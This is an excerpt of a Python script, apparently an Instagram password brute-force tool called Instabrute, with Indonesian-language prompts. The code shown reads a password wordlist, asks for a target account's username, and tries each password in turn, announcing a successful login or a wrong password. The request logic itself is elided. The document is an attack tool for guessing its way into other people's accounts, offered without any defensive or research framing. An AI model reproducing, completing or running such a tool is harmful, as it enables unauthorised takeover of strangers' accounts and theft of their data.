		...
		if os.path.isfile(self.passwordsFile):
			with open(self.passwordsFile) as f:
				...
				if (passwordsNumber > 0):
					...
					print('File Password Tidak Ada, Tambahkan Password di sini.')
					Input('[*] Tekan enter untuk Keluar')
					exit()
		else:
			print ('Buat nama Password file "%s"' % self.passwordsFile)
			Input('[*] Tekan enter untuk Keluar')
			exit()
...
instabrute = Instabrute(Input('Isi Username Target Co: '))
...
for password in instabrute.passwords:
	...
	if sess:
		print ('[*] Login Berhasil Co %s' % [instabrute.username,password])
	else:
		print ('[*] Password Salah Co [%s]' % password)
